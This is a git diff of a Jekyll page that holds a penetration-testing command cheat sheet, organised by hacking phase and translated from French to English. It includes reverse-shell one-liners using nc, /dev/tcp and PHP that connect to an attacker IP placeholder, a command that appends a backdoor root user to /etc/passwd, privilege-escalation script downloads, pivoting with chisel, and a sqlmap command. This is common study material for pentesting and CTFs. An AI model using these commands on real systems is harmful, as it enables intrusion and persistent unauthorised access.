@@ -1,7 +1,4 @@
 ---
-# Feel free to add content and custom Front Matter to this file.
-# To modify the layout, see https://jekyllrb.com/docs/themes/#overriding-theme-defaults
-
 layout: default
 ---
 # Commands by Hacking phases
@@ -10,57 +7,32 @@ layout: default
 ## Recognition
 
 {% highlight bash %}
-host [DOMAIN] # ressort IPv4 IPv6
-{% endhighlight %}
+host [DOMAIN] # get IPv4 IPv6
 
-```sh
-whois [DOMAIN] # permet de récupérer des infos sur les serveurs dns utilisés (serveur ip dispo, nom proprio, adresse)
-```
+whois [DOMAIN] # allows you to retrieve information about the dns servers used (available ip server, owner name, address)
 
-```sh
-dig [nomDomaine] # récupérer les adresses de DNS. Possibilité de récupérer d'autres informations avec les options -h
-```
+dig [nomDomaine] # retrieve DNS addresses. Other information can be retrieved with the -h
 
-```sh
-dnsenum [nomDomaine] # récuperer enregistrement DNS et serveur Nx
-```
+dnsenum [nomDomaine] # retrieve DNS records and Nx server
 
-```sh
-dmitry # @IP, domaine, mails, scan de ports...
-```
-
-```sh
 tcptraceroute [nomDomaine]
-```
 
-```sh
-theharvester -d [nomDomaine] # récupération d'emails, noms d'hotes
-```
+theharvester -d [nomDomaine] # recovery of emails, host names
 
-```sh
-maltego # recherche d'infos sur une personne, un nom de domaine...
-```
-
-
-[**Way Back Machine**](http://web.archive.org/)
-
-[**Shodan**](https://www.shodan.io/)
-
-[**Exploit Database**](https://www.exploit-db.com/)
-
+{% endhighlight %}
 
 ___
 ## Scanning
 
 ### Machine enumeration
 
-```sh
-fping/ping # vérifier la présence d'une machine sur le réseau
-fping -g [réseau local] # donne toutes les @ du réseau local qui sont reachable
-```
+{% highlight bash %}
+fping/ping # check the presence of a machine on the network
+fping -g [réseau local] # gives all the local network addresses that are reachable
+{% endhighlight %}
 
-**nmap**: scanner de port open source (graphique -> zenmap)
-```sh
+**nmap**: open source port scanner (graphical -> zenmap)
+{% highlight bash %}
 nmap -sV -p- [ip] # scan network or a machine
  -sV # service version detection
  -O  # operating system detection
@@ -84,52 +56,55 @@ nmap -sV -p- [ip] # scan network or a machine
  -oG # Grepable format
  -oX # output in xml format
 
-xsltproc filename.xml -o filename.html # on peut ouvrir dans le navigateur d'un récapitulatif facile à lire.
-```
+xsltproc filename.xml -o filename.html # You can open an easy-to-read summary in the browser.
+{% endhighlight %}
 
 
+{% highlight bash %}
+rustscan -a [ip] -- [nmap_arguments]
+{% endhighlight %}
 <br>
 
 
-```sh
-nessus # signale les faiblesses potentielles sur les machines testées (à télécharger sur tenable)
-/etc/init.d/nessusd start # démarrer nessus
-http://localhost:8834 # accès à nessus + s'enregistrer sur tenable pour un code d'activation
-```
-**wireshark** : capture des trames...
-
+{% highlight bash %}
+nessus # reports potential weaknesses on the tested machines (to be downloaded from tenable)
+/etc/init.d/nessusd start # start nessus
+http://localhost:8834 # access to nessus + register on tenable for an activation code
+{% endhighlight %}
 
 
 ### Website Scanner
 
-```sh
+{% highlight bash %}
 nikto -h [url]
 wapiti
-```
+{% endhighlight %}
 
-```sh
-gobuster dir -u [url] -w [wordlist_path] -e -x .php,.txt,.html -o output.txt
+{% highlight bash %}
+gobuster vhost -w [subdomains_list] -u [url] # look for subdomains
+feroxbuster -w [wordlist_path] -x php,html,txt -u [url] # look for hidden files or directories
 dirbuster
-wfuzz
-```
+wfuzz -z file,[wordlist_path] -d "[param]=FUZZ&[param]=FUZZ" --hc 302 [url] # Fuzz parameters
+{% endhighlight %}
 
-### URL/.git/
+#### URL/.git/
 
-```sh
-wget --mirror -I .git URL/.git/
+{% highlight bash %}
+wget --mirror -I .git [url]/.git/
 git checkout -- # if some files have been deleted, get them back
 git log
-git checkout <LOG-ID> # go back to a previous commit
+git checkout [LOG-ID] # go back to a previous commit
 
 git log --all --full-history
-git show <COMMIT-ID>
+git show [COMMIT-ID]
 git log --stat
-[script export.sh]
-```
+{% endhighlight %}
 
-+ **git-dumper**: tool to dump a git repository from a website: https://github.com/arthaud/git-dumper
-+ **git-tools**: A repository with 3 tools for pwn'ing websites with .git repositories available: https://github.com/internetwache/GitTools
-+ **githacker**: A Git source leak exploit tool that restores the entire Git repository, including data from stash, for white-box auditing and analysis of developers' mind: https://github.com/captain-noob/GitHacker
+Some automated scripts to investigate deeply.
++ **[script export.sh](gists/index.md#exportGitHistory.sh)**: Use this script to get all the history of a given file.
++ **[git-dumper](https://github.com/arthaud/git-dumper)**: tool to dump a git repository from a website.
++ **[git-tools](https://github.com/internetwache/GitTools)**: A repository with 3 tools for pwn'ing websites with .git repositories available.
++ **[githacker](https://github.com/captain-noob/GitHacker)**: A Git source leak exploit tool that restores the entire Git repository, including data from stash, for white-box auditing and analysis of developers' mind.
 
 ___
 ## Exploit (Gaining Access)
@@ -138,53 +113,59 @@ ___
 
 #### Shell upgrading
 
-```sh
+{% highlight bash %}
 /usr/bin/script -qc /bin/bash /dev/null # works almost all the time
 
 python3 -c 'import pty;pty.spawn("/bin/bash")' # only if python is installed
-```
+{% endhighlight %}
 
 #### Shell Stabilization
-```sh
+{% highlight bash %}
 export TERM=xterm # this will give us access to term commands such as clear
 Ctrl + Z # background the shell
 stty raw -echo; fg # This does two things: 1. it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
-```
+{% endhighlight %}
+
+#### Write multiple lines in a file with `echo`
+
+{% highlight bash %}
+echo "line 1
+line 2" >> file.txt
+{% endhighlight %}
 
 #### BASH reverse shell one line
-```sh
+{% highlight bash %}
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] 4444 >/tmp/f
 
-bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" # possibility not to use 'bash -c' at the beginning
+bash -c "bash -i >& /dev/tcp/[ip]/4444 0>&1" # possibility not to use 'bash -c' at the beginning
 
 nc [IP] [PORT]
 
 php -r '$sock=fsockopen("[IP]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
+{% endhighlight %}
 
 ___
 ## Persistence (Maintaining Access) - Privilege Escalation
 
-```sh
+{% highlight bash %}
 echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd # to create another root user
-```
+{% endhighlight %}
 
 
 ### Linux Privilege Escalation
 
+{% highlight bash %}
+sudo -l # checks current privileges
 
-```sh
-sudo -l # check current privileges
+netstat -ltupn # listening ports
+ss -tulw # listening ports
 
-netstat -ltupn # listening port
-ss -tulw # listening port
-
-cat /etc/crontab # checko cronjob
-```
+cat /etc/crontab # checks cronjob
+{% endhighlight %}
 
 #### FIND
 
-```sh
+{% highlight bash %}
 find / -iname "*config*.php" 2>/dev/null # looking for config files - cat [filename] | grep -i "db_"
 find / -user root -perm -u=s 2>/dev/null # Find all files/dirs that are owned by root and have at least the SUID permission
 
@@ -195,102 +176,27 @@ find / -user [username] 2>/dev/null # Find all files/dirs owned by a user
 -perm /444 # only readable by everyone
 
 -exec [command] [option] {}\; 2>/dev/null # {} corresponds to the files returned by the find command
-```
+{% endhighlight %}
+
+#### Capabilities
+
+{% highlight bash %}
+getcap -r / 2>/dev/null # scan the system for capabilities.
+{% endhighlight %}
 
 #### GREP
 
-```sh
+{% highlight bash %}
 grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" # grep ip addresses from your output.
-```
-
-#### LSE - linux-smart-enumeration
-https://github.com/diego-treitos/linux-smart-enumeration
-
-```sh
-wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
-
-curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
-```
-
-
-#### LES - linux-exploit-suggester
-https://github.com/mzet-/linux-exploit-suggester
-
-```sh
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh;chmod 700 les.sh
-```
-
-#### LinPEAS - Linux Privilege Escalation Awesome Script
-https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-
-```sh
-curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -Lo lPEAS.sh;chmod 700 lPEAS.sh
-```
-___
-## Clearing Track
-
-TODO
-
-___
-# Other useful commands
-
-## Steganography
-
-Find images information
-
-```sh
-identify -verbose
-pngcheck [image]
-zsteg [image] # detect stegano data hidden in PNG & BMP
-```
-
-```sh
-steghide extract -sf [filename]
-stegcracker [file] [wordlist] # bruteforce steghide passphrase
-```
-
-___
-## HTTP Server
-
-### One line
-
-```sh
-python -m SimpleHTTPServer 8000 # Python 2.x
-
-python -m http.server 8000 # Python 3.x
-
-updog # allow uploads
-```
-
-___
-## SSH
-
-```sh
-ssh [ip] -p [port] # connect to an ssh server
-```
-
-### SSH port forwarding
-```sh
-ssh -N user@[IP_distant] -L [@_redirection_machine]:[port_redirection]:[IP_redirigee]:[port_redirige]
-```
-
-
-Example:
-```sh
-ssh -N user@10.10.10.10 -L 172.17.0.1:4441:192.168.0.100:80
-```
-Sur la machine `10.10.10.10`, `user` fait tourner un serveur web au niveau de son interface `192.168.0.100:80`. Ici, je redirige sur mon adresse `172.17.0.1` (celle sur le même réseau que mon container docker) et sur le port 4441. Donc depuis mon navigateur, http://172.17.0.1:4441 est joignable. En indiquant un proxy sur `172.17.0.2:4440`, je peux modifier les requêtes sur Burpsuite si besoin.
-
-## Chisel
-
-[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+{% endhighlight %}
 
 ### Port forwarding
 
-```sh
+**[Using Chisel](https://github.com/jpillora/chisel)**
+{% highlight bash %}
 # on the attacker
 cd /path/where/chisel/is # binary file
-updog # or whatever cmdline to setup a http server
+updog # or whatever cmdline to setup an http server
 
 # on the victim
 wget IP:PORT/chisel
@@ -303,39 +209,95 @@ chisel server --reverse --port 9002 # port forwarding
 ./chisel client YOUR_IP:9002 R:9001:[redirectedIP]:[redirectedPort]
 
 # Now you have access on the attacker's machine to : localhost:9001
-```
-___
-## File Editor
+{% endhighlight %}
 
-```sh
-hexeditor # hexadecimal
-```
+**Using SSH**
+{% highlight bash %}
+ssh -N user@[IP_distant] -L [@_redirection_machine]:[port_redirection]:[IP_redirigee]:[port_redirige]
+{% endhighlight %}
+
+Example:
+{% highlight bash %}
+ssh -N user@10.10.10.10 -L 172.17.0.1:4441:192.168.0.100:80
+{% endhighlight %}
+On the `10.10.10.10` machine, `user` is running a web server on its `192.168.0.100:80` interface. Here, I'm redirecting to my `172.17.0.1` address (the one on the same network as my docker container) and port 4441. So from my browser, http://172.17.0.1:4441 is reachable. By specifying a proxy on `172.17.0.2:4440`, I can modify the requests on Burpsuite if needed.
+
+
+#### Automated scripts for linux privesc
+
+**[LSE - linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)**
+{% highlight bash %}
+wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
+
+curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
+{% endhighlight %}
+
+**[LES - linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)**
+{% highlight bash %}
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh;chmod 700 les.sh
+{% endhighlight %}
+
+**[LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)**
+{% highlight bash %}
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -Lo lPEAS.sh;chmod 700 lPEAS.sh
+{% endhighlight %}
 
 ___
+## Clearing Track
+
+TODO
+
+___
+# Other useful commands
+
+## HTTP ServerOne line
+
+{% highlight bash %}
+python -m SimpleHTTPServer 8000 # Python 2.x
+
+python -m http.server 8000 # Python 3.x
+
+updog # allows uploads
+{% endhighlight %}
+
+## Steganography
+
+Find images information
+
+{% highlight bash %}
+identify -verbose
+pngcheck [image]
+zsteg [image] # detects stegano data hidden in PNG & BMP
+
+
+steghide extract -sf [filename]
+stegseek [file] [wordlist] # bruteforce steghide passphrase
+{% endhighlight %}
+
+
 ## Web
-
 
 ### Attaque SQL
 
-```sh
+{% highlight bash %}
 sqlmap -u "http://172.16.128.39:8080/student_grade/index.php?student_id=" --tables -D Dysto_School -T student
-```
+{% endhighlight %}
 
 ### Website request command line
-```sh
+{% highlight bash %}
 curl -v [url]
 curl -v -X POST [url]
 wget [url]
-```
+{% endhighlight %}
 
 ___
 ## Forensic Investigation
-```sh
+{% highlight bash %}
 volatility
 testdisk
-```
+{% endhighlight %}
 
 ### Hidden files extraction
-```sh
+{% highlight bash %}
 binwalk -e
-```
+{% endhighlight %}
